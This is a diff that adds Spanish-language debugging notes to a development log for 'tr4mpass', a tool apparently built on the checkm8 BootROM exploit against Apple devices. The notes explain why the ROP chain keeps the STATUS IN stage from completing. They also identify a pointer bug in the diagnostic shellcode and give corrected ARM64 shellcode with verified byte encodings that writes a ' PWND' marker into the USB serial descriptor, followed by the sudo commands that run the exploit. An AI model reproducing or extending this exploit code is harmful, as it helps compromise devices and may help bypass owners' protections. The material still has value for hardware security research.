@@ -2220,6 +2220,100 @@ send_dfu_finalize: zero-length send ret=0           ← ZLP!
 checkm8_verify_pwned: serial hex = [41 41 41 41 ...] ← CANARY / PWND!
 ```
 
+---
+
+## v1.0.48 — RESULTADO: clear_halt ret=-5 (Entity not found) (2026-06-10)
+
+### Dato crítico:
+```
+checkm8: [stage4] clear_halt(EP0): ret=-5 (Entity not found)
+```
+
+`LIBUSB_ERROR_NOT_FOUND` = EP0 **no estaba en estado HALT**. La hipótesis era incorrecta.
+El payload DNLOAD sigue timeout a los 50ms (mismo que antes).
+
+### Lo que esto prueba:
+- EP0 no estaba halted → el STALL del overwrite no dejó EP0 en HALT
+- El STATUS IN del payload DNLOAD no completa por otra razón
+- El BootROM genuinamente NO responde el STATUS IN del payload DNLOAD
+
+### Conclusión final sobre el STATUS IN:
+El ROP chain se activa DURANTE la finalización del DATA OUT del payload DNLOAD
+(inside `usb_core_complete_endpoint_io`). En ese punto el BootROM:
+1. Ejecuta nop_gadget → func_gadget → write_ttbr0 → tlbi → exec_addr
+2. Shellcode ejecuta
+3. El BootROM **nunca regresa** para enviar el STATUS IN ZLP — está ocupado con el ROP
+
+Por eso el STATUS IN siempre timeout: **el ROP ya ejecutó antes de que el BootROM pudiera responder el STATUS**.
+
+---
+
+## BUG CRÍTICO DESCUBIERTO: diag shellcode v1.0.44-v1.0.48 era INCORRECTO (2026-06-10)
+
+### El bug:
+El shellcode de diagnóstico hacía:
+```arm64
+ldr x0, =gUSBSerialNumber   ; x0 = 0x180083CF8  ← dirección DEL PUNTERO
+str w1, [x0]                 ; *0x180083CF8 = 0x41414141 ← SOBREESCRIBE EL PUNTERO!
+```
+
+`gUSBSerialNumber` es una **variable puntero** en SRAM que APUNTA a la string descriptor.
+El shellcode estaba escribiendo `0x41414141` a la DIRECCIÓN DEL PUNTERO (corrompiendo el puntero),
+NO a la string a la que apunta.
+
+**Consecuencias:**
+1. El BootROM crasheaba al intentar usar el puntero corrompido → no veíamos nada
+2. Si no crasheaba, escribía a SRAM que se reinicia en cada power cycle → invisible
+3. El canary NUNCA podía aparecer con este enfoque
+
+**Esto significa que todos los experimentos anteriores fallaron por este bug en el diagnóstico,
+NO necesariamente porque el ROP chain fallara.**
+
+---
+
+## v1.0.49 — Diag shellcode v2: dereference correcto (2026-06-10)
+
+### Fix:
+```arm64
+// Nuevo shellcode correcto:
+ldr x0, pool_ptr     ; x0 = &gUSBSerialNumber (dirección de la variable puntero)
+ldr x0, [x0]        ; x0 = *gUSBSerialNumber  (deref → dirección del string descriptor)
+add x0, x0, #1      ; x0 = descriptor_base + 1  (igual que gaster)
+adr x1, pool_str    ; x1 → " PWND:[D" (literal 8 bytes)
+ldr x2, [x1]        ; x2 = " PWND:[D" as uint64
+str x2, [x0]        ; escribe a descriptor[1..8]  ← PERSISTE!
+```
+
+Bytes ARM64 verificados con Python encoder:
+- `ldr x0`: `0x20, 0x01, 0x00, 0x58` (pool_ptr @ +0x28)  ✅
+- `adr x1`: `0x01, 0x01, 0x00, 0x10` (pool_str @ +0x30)  ✅
+
+### Por qué persiste:
+La escritura va al **USB string descriptor buffer** en SRAM — no se resetea con USB bus reset,
+solo con power cycle. El verify lee ese descriptor → debería ver ` PWND:[D...` en el serial.
+
+### Dos posibles resultados:
+```
+SI aparece " PWND" → el ROP chain funciona perfectamente, solo el diag era malo
+NO aparece " PWND" → el ROP chain realmente falla (primer diagnóstico real)
+```
+
+### Comandos:
+```bash
+# Prueba con DIAG v2
+sudo CHECKM8_DIAG_SHELLCODE=1 ./tr4mpass
+
+# Si funciona, probar shellcode real (sin DIAG):
+sudo ./tr4mpass
+```
+
+### Estado:
+- ✅ Implementado (commit 3520e41)
+- Pendiente de prueba en dispositivo
+
+
+```
+
 
 
 
